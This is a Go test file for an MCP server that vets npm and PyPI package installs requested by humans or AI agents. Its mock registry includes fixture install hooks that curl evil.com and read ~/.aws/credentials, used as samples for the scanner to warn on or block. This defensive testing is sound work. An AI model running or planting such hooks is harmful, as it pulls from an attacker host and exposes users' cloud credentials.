package mcp

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sairintechnologycom/pkgsafe/internal/cache"
	rnpm "github.com/sairintechnologycom/pkgsafe/internal/registry/npm"
	rpypi "github.com/sairintechnologycom/pkgsafe/internal/registry/pypi"
	"github.com/sairintechnologycom/pkgsafe/internal/types"
)

func TestMCPServer(t *testing.T) {
	tmpHome := t.TempDir()
	oldHome := os.Getenv("HOME")
	os.Setenv("HOME", tmpHome)
	defer os.Setenv("HOME", oldHome)

	// Set up mock registry server
	srv := testRegistryServer(t, map[string]string{
		"1.0.0": testPackageJSON(t, "safe-package"),
		"2.0.0": testPackageJSON(t, "postinstall-curl"),
		"3.0.0": testPackageJSON(t, "reads-credentials"),
	}, "1.0.0")
	defer srv.Close()

	// Direct DefaultRegistryURL to mock registry
	oldURL := rnpm.DefaultRegistryURL
	rnpm.DefaultRegistryURL = srv.URL
	defer func() { rnpm.DefaultRegistryURL = oldURL }()

	oldPyPIURL := rpypi.DefaultRegistryURL
	rpypi.DefaultRegistryURL = srv.URL
	defer func() { rpypi.DefaultRegistryURL = oldPyPIURL }()

	// Write a temp policy file for testing
	tempDir := t.TempDir()
	policyPath := filepath.Join(tempDir, "policy.yaml")
	defaultPolicyBytes, err := os.ReadFile("../../default-policy.yaml")
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(policyPath, defaultPolicyBytes, 0644); err != nil {
		t.Fatal(err)
	}

	config := ServerConfig{
		PolicyPath: policyPath,
		LogLevel:   "debug",
	}

	// 1. Tool discovery returns expected tools
	t.Run("tools/list", func(t *testing.T) {
		inReader, inWriter := io.Pipe()
		outReader, outWriter := io.Pipe()
		defer inWriter.Close()
		defer outWriter.Close()

		go func() {
			_ = Serve(config, inReader, outWriter)
		}()

		req := Request{
			JSONRPC: "2.0",
			ID:      1,
			Method:  "tools/list",
		}
		writeReq(t, inWriter, req)

		var resp Response
		readResp(t, outReader, &resp)

		if resp.Error != nil {
			t.Fatalf("unexpected error: %v", resp.Error)
		}

		var toolList ToolListResult
		b, err := json.Marshal(resp.Result)
		if err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal(b, &toolList); err != nil {
			t.Fatal(err)
		}

		expected := []string{
			"validate_package_install",
			"explain_package_risk",
			"score_lockfile",
			"suggest_safe_alternative",
			"validate_install_command",
		}

		for _, name := range expected {
			found := false
			for _, tool := range toolList.Tools {
				if tool.Name == name {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("missing expected tool: %s", name)
			}
		}
	})

	// Helper to run tools/call on the server
	callTool := func(t *testing.T, toolName string, arguments any) (CallToolResult, error) {
		t.Helper()
		inReader, inWriter := io.Pipe()
		outReader, outWriter := io.Pipe()
		defer inWriter.Close()
		defer outWriter.Close()

		go func() {
			_ = Serve(config, inReader, outWriter)
		}()

		argsBytes, err := json.Marshal(arguments)
		if err != nil {
			t.Fatal(err)
		}
		req := Request{
			JSONRPC: "2.0",
			ID:      1,
			Method:  "tools/call",
			Params:  json.RawMessage(fmtCallParams(toolName, argsBytes)),
		}
		writeReq(t, inWriter, req)

		var resp Response
		readResp(t, outReader, &resp)

		if resp.Error != nil {
			return CallToolResult{}, resp.Error
		}

		var res CallToolResult
		b, err := json.Marshal(resp.Result)
		if err != nil {
			t.Fatal(err)
		}
		if err := json.Unmarshal(b, &res); err != nil {
			t.Fatal(err)
		}
		return res, nil
	}

	// 2. validate_package_install returns allow for safe package
	t.Run("validate_package_install safe package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "1.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "allow" {
			t.Errorf("expected decision allow, got %s", valRes.Decision)
		}
		if !valRes.InstallAllowed {
			t.Errorf("expected install_allowed true, got false")
		}
	})

	// 3. validate_package_install returns warn for suspicious package
	t.Run("validate_package_install suspicious package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "2.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" {
			t.Errorf("expected decision warn, got %s", valRes.Decision)
		}
	})

	// 4. validate_package_install returns block for credential-risk package
	t.Run("validate_package_install credential-risk package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "3.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "block" {
			t.Errorf("expected decision block, got %s", valRes.Decision)
		}
		if valRes.InstallAllowed {
			t.Errorf("expected install_allowed false, got true")
		}
		if valRes.AgentInstruction.Action != "never_install" {
			t.Errorf("expected agent instruction never_install, got %+v", valRes.AgentInstruction)
		}
	})

	// 5. requested_by = ai_agent with warn sets install_allowed = false
	t.Run("ai_agent requested warn package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "2.0.0",
			"requested_by": "ai_agent",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" && valRes.Decision != "block" {
			t.Errorf("expected decision warn or block, got %s", valRes.Decision)
		}
		if valRes.InstallAllowed {
			t.Errorf("expected install_allowed false for ai_agent, got true")
		}
		if valRes.AgentInstruction.Action != "ask_human" && valRes.AgentInstruction.Action != "never_install" {
			t.Errorf("expected ai agent instruction ask_human or never_install, got %+v", valRes.AgentInstruction)
		}
		// Confirm the ai_agent_requested_suspicious_package rule is in reasons
		foundAgentRule := false
		for _, r := range valRes.Reasons {
			if r.ID == "ai_agent_requested_suspicious_package" {
				foundAgentRule = true
				break
			}
		}
		if !foundAgentRule {
			t.Errorf("expected ai_agent_requested_suspicious_package to be in reasons")
		}
		auditLog := filepath.Join(tmpHome, ".pkgsafe", "audit.log")
		auditBytes, err := os.ReadFile(auditLog)
		if err != nil {
			t.Fatalf("expected MCP audit log: %v", err)
		}
		if !bytes.Contains(auditBytes, []byte("mcp validate_package_install npm/")) {
			t.Fatalf("expected validate_package_install audit entry, got %s", string(auditBytes))
		}
		if !bytes.Contains(auditBytes, []byte("requested_by=ai_agent")) {
			t.Fatalf("expected requested_by in audit entry, got %s", string(auditBytes))
		}
	})

	// 6. requested_by = human with warn sets install_allowed = true
	t.Run("human requested warn package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "2.0.0",
			"requested_by": "human",
			"mode":         "warn",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" {
			t.Errorf("expected decision warn, got %s", valRes.Decision)
		}
		if !valRes.InstallAllowed {
			t.Errorf("expected install_allowed true for human in warn mode, got false")
		}
		if valRes.AgentInstruction.Action != "ask_human" {
			t.Errorf("expected warn decision to advise human review, got %+v", valRes.AgentInstruction)
		}
	})

	// 7. explain_package_risk returns metadata summary
	t.Run("explain_package_risk", func(t *testing.T) {
		res, err := callTool(t, "explain_package_risk", map[string]any{
			"ecosystem": "npm",
			"name":      "fixture",
			"version":   "2.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var expRes ExplainPackageRiskResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &expRes); err != nil {
			t.Fatal(err)
		}

		if expRes.Summary == "" {
			t.Errorf("expected non-empty summary")
		}
		if len(expRes.TopRisks) == 0 {
			t.Errorf("expected top risks listed")
		}
		if expRes.Metadata.LatestVersion != "2.0.0" {
			t.Errorf("expected metadata latest version 2.0.0, got %s", expRes.Metadata.LatestVersion)
		}
	})

	// 8. score_lockfile returns summary counts
	t.Run("score_lockfile", func(t *testing.T) {
		res, err := callTool(t, "score_lockfile", map[string]any{
			"path":      "../../testdata/npm/package-lock.json",
			"ecosystem": "npm",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var slRes ScoreLockfileResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &slRes); err != nil {
			t.Fatal(err)
		}

		if slRes.Summary.TotalPackages != 2 {
			t.Errorf("expected 2 packages in lockfile, got %d", slRes.Summary.TotalPackages)
		}
		if slRes.Summary.Warn != 1 {
			t.Errorf("expected 1 warning (axois typosquat), got %d", slRes.Summary.Warn)
		}
	})

	// 9. suggest_safe_alternative returns curated alternatives
	t.Run("suggest_safe_alternative curated", func(t *testing.T) {
		res, err := callTool(t, "suggest_safe_alternative", map[string]any{
			"ecosystem":         "npm",
			"requested_package": "react-markdown-renderer-plus",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var ssaRes SuggestSafeAlternativeResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &ssaRes); err != nil {
			t.Fatal(err)
		}

		if len(ssaRes.Alternatives) == 0 {
			t.Fatalf("expected alternatives, got none")
		}
		if ssaRes.Alternatives[0].Name != "react-markdown" {
			t.Errorf("expected react-markdown alternative, got %s", ssaRes.Alternatives[0].Name)
		}
	})

	t.Run("suggest_safe_alternative dynamic heuristic", func(t *testing.T) {
		res, err := callTool(t, "suggest_safe_alternative", map[string]any{
			"ecosystem":         "npm",
			"requested_package": "axios-pro",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var ssaRes SuggestSafeAlternativeResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &ssaRes); err != nil {
			t.Fatal(err)
		}

		if len(ssaRes.Alternatives) == 0 {
			t.Fatalf("expected alternatives, got none")
		}
		if ssaRes.Alternatives[0].Name != "axios" {
			t.Errorf("expected axios alternative, got %s", ssaRes.Alternatives[0].Name)
		}
	})

	// 10. validate_install_command parses npm install axios
	t.Run("validate_install_command single", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "npm install fixture@1.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var vicRes ValidateInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &vicRes); err != nil {
			t.Fatal(err)
		}

		if len(vicRes.Packages) != 1 {
			t.Fatalf("expected 1 package, got %d", len(vicRes.Packages))
		}
		if vicRes.Packages[0].Name != "safe-example" {
			t.Errorf("expected package safe-example, got %s", vicRes.Packages[0].Name)
		}
	})

	// 11. validate_install_command parses multiple packages
	t.Run("validate_install_command multiple", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "npm i fixture@1.0.0 fixture@2.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var vicRes ValidateInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &vicRes); err != nil {
			t.Fatal(err)
		}

		if len(vicRes.Packages) != 2 {
			t.Fatalf("expected 2 packages, got %d", len(vicRes.Packages))
		}
		if vicRes.AgentInstruction.Action == "" {
			t.Fatalf("expected validate_install_command agent instruction")
		}
		auditLog := filepath.Join(tmpHome, ".pkgsafe", "audit.log")
		auditBytes, err := os.ReadFile(auditLog)
		if err != nil {
			t.Fatalf("expected MCP command audit log: %v", err)
		}
		if !bytes.Contains(auditBytes, []byte("mcp validate_install_command requested_by=ai_agent")) {
			t.Fatalf("expected validate_install_command audit entry, got %s", string(auditBytes))
		}
	})

	// 12. validate_install_command rejects unsupported commands
	t.Run("validate_install_command unsupported", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "apt-get install axios",
		})
		if err != nil {
			t.Fatal(err)
		}
		if !res.IsError {
			t.Fatalf("expected tool execution error, got success")
		}

		var te ToolError
		if err := json.Unmarshal([]byte(res.Content[0].Text), &te); err != nil {
			t.Fatal(err)
		}
		if te.Error.Code != "INVALID_INSTALL_COMMAND" {
			t.Errorf("expected error code INVALID_INSTALL_COMMAND, got %s", te.Error.Code)
		}
	})

	// 13. Offline MCP mode uses local cache
	t.Run("offline mode cache check", func(t *testing.T) {
		store, err := cache.Load("")
		if err != nil {
			t.Fatal(err)
		}
		// Write a dummy cached result for a fake package
		fakeRes := types.ScanResult{
			Package: types.PackageIdentity{
				Ecosystem: "npm",
				Name:      "fake-offline-pkg",
				Version:   "1.2.3",
			},
			Decision: types.DecisionAllow,
			Score:    5,
		}
		if err := store.Put(fakeRes); err != nil {
			t.Fatal(err)
		}

		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem": "npm",
			"name":      "fake-offline-pkg",
			"version":   "1.2.3",
			"offline":   true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error in offline: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Package != "fake-offline-pkg" || valRes.Version != "1.2.3" {
			t.Errorf("expected fake-offline-pkg@1.2.3, got %s@%s", valRes.Package, valRes.Version)
		}
	})

	// 14. Invalid package returns structured error
	t.Run("invalid package not found error", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem": "npm",
			"name":      "non-existent-package-404",
			"version":   "latest",
		})
		if err != nil {
			t.Fatal(err)
		}
		if !res.IsError {
			t.Fatalf("expected tool execution error, got success")
		}

		var te ToolError
		if err := json.Unmarshal([]byte(res.Content[0].Text), &te); err != nil {
			t.Fatal(err)
		}
		if te.Error.Code != "PACKAGE_NOT_FOUND" {
			t.Errorf("expected error code PACKAGE_NOT_FOUND, got %s", te.Error.Code)
		}
	})

	// 15. MCP validate_package_install behavior-analysis check
	t.Run("validate_package_install with legacy sandbox input", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "3.0.0",
			"requested_by": "ai_agent",
			"sandbox":      true,
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.BehaviorAnalysis == nil {
			t.Fatal("expected behavior analysis result metadata to be populated, got nil")
		}
		if !valRes.BehaviorAnalysis.Enabled {
			t.Error("expected behavior_analysis.enabled to be true")
		}
		if !valRes.BehaviorAnalysis.Available {
			t.Error("expected behavior_analysis.available to be true")
		}
		if valRes.BehaviorAnalysis.BehaviorMode != types.BehaviorHeuristic {
			t.Errorf("expected behavior_mode heuristic, got %q", valRes.BehaviorAnalysis.BehaviorMode)
		}
		if valRes.BehaviorAnalysis.NotPerformedReason == "" {
			t.Error("expected blocked package to skip behavior execution with a reason")
		}
		if valRes.BehaviorAnalysis.FindingsCount != 0 {
			t.Errorf("expected behavior_analysis.findings_count to be 0 because BLOCK package was not executed, got %d", valRes.BehaviorAnalysis.FindingsCount)
		}
		if valRes.InstallAllowed {
			t.Error("expected install_allowed to be false for AI agent with blocking findings")
		}
	})

	// 15.5. validate_package_install supports PyPI
	t.Run("validate_package_install PyPI package", func(t *testing.T) {
		res, err := callTool(t, "validate_package_install", map[string]any{
			"ecosystem":    "pypi",
			"name":         "pypi-fixture",
			"version":      "1.0.0",
			"requested_by": "human",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var valRes ValidatePackageInstallResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &valRes); err != nil {
			t.Fatal(err)
		}

		if valRes.Decision != "warn" && valRes.Decision != "block" {
			t.Errorf("expected decision warn or block for pypi-fixture, got %s", valRes.Decision)
		}
	})

	// 15.6. validate_install_command parses pip install requests
	t.Run("validate_install_command pip install requests", func(t *testing.T) {
		res, err := callTool(t, "validate_install_command", map[string]any{
			"command": "pip install requests==2.31.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("tool execution error: %s", res.Content[0].Text)
		}

		var vicRes ValidateInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &vicRes); err != nil {
			t.Fatal(err)
		}

		if vicRes.Ecosystem != "pypi" {
			t.Errorf("expected ecosystem pypi, got %s", vicRes.Ecosystem)
		}
	})

	// 16. MCP server starts without printing non-JSON text to stdout
	t.Run("starts clean", func(t *testing.T) {
		inReader := strings.NewReader("")
		var outBuf bytes.Buffer
		err := Serve(config, inReader, &outBuf)
		if err != nil {
			t.Fatal(err)
		}
		// Stderr should not leak into stdout
		if outBuf.Len() > 0 {
			t.Fatalf("stdout contains unrequested output: %q", outBuf.String())
		}
	})

	t.Run("malformed request returns json rpc only on stdout", func(t *testing.T) {
		inReader := strings.NewReader("{bad json}\n")
		var outBuf bytes.Buffer
		err := Serve(ServerConfig{}, inReader, &outBuf)
		if err != nil {
			t.Fatal(err)
		}
		lines := strings.Split(strings.TrimSpace(outBuf.String()), "\n")
		if len(lines) != 1 {
			t.Fatalf("expected one JSON-RPC response line, got %q", outBuf.String())
		}
		var resp Response
		if err := json.Unmarshal([]byte(lines[0]), &resp); err != nil {
			t.Fatalf("stdout was not JSON-RPC JSON: %q", lines[0])
		}
		if resp.Error == nil || resp.Error.Code != -32700 {
			t.Fatalf("expected parse error response, got %+v", resp)
		}
	})

	// 17. check_package tests (safe, warn, block)
	t.Run("check_package safe", func(t *testing.T) {
		res, err := callTool(t, "check_package", map[string]any{
			"ecosystem": "npm",
			"name":      "fixture",
			"version":   "1.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var agentRes AgentMCPResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &agentRes); err != nil {
			t.Fatal(err)
		}
		if agentRes.Decision != "ALLOW" {
			t.Errorf("expected ALLOW decision, got %s", agentRes.Decision)
		}
		if agentRes.AgentInstruction != "Package may be installed." {
			t.Errorf("unexpected instruction: %s", agentRes.AgentInstruction)
		}
	})

	t.Run("check_package warn", func(t *testing.T) {
		res, err := callTool(t, "check_package", map[string]any{
			"ecosystem": "npm",
			"name":      "fixture",
			"version":   "2.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var agentRes AgentMCPResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &agentRes); err != nil {
			t.Fatal(err)
		}
		if agentRes.Decision != "WARN" {
			t.Errorf("expected WARN decision, got %s", agentRes.Decision)
		}
	})

	t.Run("check_package block", func(t *testing.T) {
		res, err := callTool(t, "check_package", map[string]any{
			"ecosystem": "npm",
			"name":      "fixture",
			"version":   "3.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var agentRes AgentMCPResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &agentRes); err != nil {
			t.Fatal(err)
		}
		if agentRes.Decision != "BLOCK" {
			t.Errorf("expected BLOCK decision, got %s", agentRes.Decision)
		}
	})

	// 18. check_install_command tests
	t.Run("check_install_command safe", func(t *testing.T) {
		res, err := callTool(t, "check_install_command", map[string]any{
			"command": "npm install fixture@1.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var commandRes CheckInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &commandRes); err != nil {
			t.Fatal(err)
		}
		if commandRes.Decision != "ALLOW" {
			t.Errorf("expected ALLOW decision, got %s", commandRes.Decision)
		}
	})

	t.Run("check_install_command block", func(t *testing.T) {
		res, err := callTool(t, "check_install_command", map[string]any{
			"command": "npm install fixture@3.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var commandRes CheckInstallCommandResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &commandRes); err != nil {
			t.Fatal(err)
		}
		if commandRes.Decision != "BLOCK" {
			t.Errorf("expected BLOCK decision, got %s", commandRes.Decision)
		}
	})

	// 19. explain_policy_decision tests
	t.Run("explain_policy_decision", func(t *testing.T) {
		res, err := callTool(t, "explain_policy_decision", map[string]any{
			"package": "npm:fixture@3.0.0",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var explainRes ExplainPolicyDecisionResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &explainRes); err != nil {
			t.Fatal(err)
		}
		if explainRes.Decision != "BLOCK" {
			t.Errorf("expected BLOCK, got %s", explainRes.Decision)
		}
		if len(explainRes.RuleIDs) == 0 {
			t.Errorf("expected rule_ids to be populated")
		}
	})

	// 20. record_agent_decision tests
	t.Run("record_agent_decision", func(t *testing.T) {
		res, err := callTool(t, "record_agent_decision", map[string]any{
			"ecosystem":    "npm",
			"name":         "fixture",
			"version":      "1.0.0",
			"decision":     "ALLOW",
			"action_taken": "installed",
			"agent":        "codex",
		})
		if err != nil {
			t.Fatal(err)
		}
		if res.IsError {
			t.Fatalf("expected success, got error: %s", res.Content[0].Text)
		}
		var recordRes AgentMCPResult
		if err := json.Unmarshal([]byte(res.Content[0].Text), &recordRes); err != nil {
			t.Fatal(err)
		}
		if recordRes.Decision != "ALLOW" {
			t.Errorf("expected ALLOW decision, got %s", recordRes.Decision)
		}
	})
}

func fmtCallParams(toolName string, args []byte) string {
	return `{"name":"` + toolName + `","arguments":` + string(args) + `}`
}

func writeReq(t *testing.T, w io.Writer, req Request) {
	t.Helper()
	b, err := json.Marshal(req)
	if err != nil {
		t.Fatal(err)
	}
	_, err = w.Write(append(b, '\n'))
	if err != nil {
		t.Fatal(err)
	}
}

func readResp(t *testing.T, r io.Reader, resp *Response) {
	t.Helper()
	dec := json.NewDecoder(r)
	if err := dec.Decode(resp); err != nil {
		t.Fatal(err)
	}
}

func testRegistryServer(t *testing.T, versions map[string]string, latest string) *httptest.Server {
	t.Helper()
	tarballs := map[string][]byte{}
	for version, pkgJSON := range versions {
		tarballs["/tarballs/fixture-"+version+".tgz"] = testMakeTarball(t, map[string]string{
			"package/package.json": pkgJSON,
		})
	}
	tarballs["/tarballs/pypi-fixture-1.0.0.tar.gz"] = testMakeTarball(t, map[string]string{
		"setup.py": "import os; os.system('curl http://evil.com')",
	})
	tarballs["/tarballs/requests-2.31.0.tar.gz"] = testMakeTarball(t, map[string]string{
		"setup.py": "import os; os.system('curl http://evil.com')",
	})

	mux := http.NewServeMux()
	var srv *httptest.Server
	mux.HandleFunc("/fixture", func(w http.ResponseWriter, r *http.Request) {
		type dist struct {
			Tarball   string `json:"tarball"`
			Integrity string `json:"integrity"`
		}
		type versionMetadata struct {
			Name    string            `json:"name"`
			Version string            `json:"version"`
			Scripts map[string]string `json:"scripts,omitempty"`
			Dist    dist              `json:"dist"`
		}
		body := struct {
			Name     string                     `json:"name"`
			DistTags map[string]string          `json:"dist-tags"`
			Versions map[string]versionMetadata `json:"versions"`
		}{
			Name:     "fixture",
			DistTags: map[string]string{"latest": latest},
			Versions: map[string]versionMetadata{},
		}
		for version := range versions {
			tarball := tarballs["/tarballs/fixture-"+version+".tgz"]
			sum := sha512.Sum512(tarball)
			var scripts map[string]string
			if version == "2.0.0" {
				scripts = map[string]string{"postinstall": "curl http://evil.com"}
			} else if version == "3.0.0" {
				scripts = map[string]string{"postinstall": "cat ~/.aws/credentials"}
			}
			body.Versions[version] = versionMetadata{
				Name:    "fixture",
				Version: version,
				Scripts: scripts,
				Dist: dist{
					Tarball:   srv.URL + "/tarballs/fixture-" + version + ".tgz",
					Integrity: "sha512-" + base64.StdEncoding.EncodeToString(sum[:]),
				},
			}
		}
		_ = json.NewEncoder(w).Encode(body)
	})
	mux.HandleFunc("/pypi-fixture/json", func(w http.ResponseWriter, r *http.Request) {
		tb := tarballs["/tarballs/pypi-fixture-1.0.0.tar.gz"]
		hash := sha256.Sum256(tb)
		md := rpypi.Metadata{
			Info: rpypi.Info{
				Name:    "pypi-fixture",
				Version: "1.0.0",
			},
			Releases: map[string][]rpypi.File{
				"1.0.0": {
					{
						Filename:    "pypi-fixture-1.0.0.tar.gz",
						PackageType: "sdist",
						URL:         srv.URL + "/tarballs/pypi-fixture-1.0.0.tar.gz",
						Size:        int64(len(tb)),
						Digests:     map[string]string{"sha256": hex.EncodeToString(hash[:])},
					},
				},
			},
		}
		_ = json.NewEncoder(w).Encode(md)
	})
	mux.HandleFunc("/requests/json", func(w http.ResponseWriter, r *http.Request) {
		tb := tarballs["/tarballs/requests-2.31.0.tar.gz"]
		hash := sha256.Sum256(tb)
		md := rpypi.Metadata{
			Info: rpypi.Info{
				Name:    "requests",
				Version: "2.31.0",
			},
			Releases: map[string][]rpypi.File{
				"2.31.0": {
					{
						Filename:    "requests-2.31.0.tar.gz",
						PackageType: "sdist",
						URL:         srv.URL + "/tarballs/requests-2.31.0.tar.gz",
						Size:        int64(len(tb)),
						Digests:     map[string]string{"sha256": hex.EncodeToString(hash[:])},
					},
				},
			},
		}
		_ = json.NewEncoder(w).Encode(md)
	})
	mux.HandleFunc("/tarballs/", func(w http.ResponseWriter, r *http.Request) {
		b, ok := tarballs[r.URL.Path]
		if !ok {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write(b)
	})
	mux.HandleFunc("/non-existent-package-404", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = w.Write([]byte(`{"error":"Not Found"}`))
	})
	srv = httptest.NewServer(mux)
	return srv
}

func testPackageJSON(t *testing.T, fixture string) string {
	t.Helper()
	path := filepath.Join("..", "..", "testdata", "npm", fixture, "package.json")
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func testMakeTarball(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, content := range files {
		hdr := &tar.Header{
			Name: name,
			Mode: 0644,
			Size: int64(len(content)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	if err := gw.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}
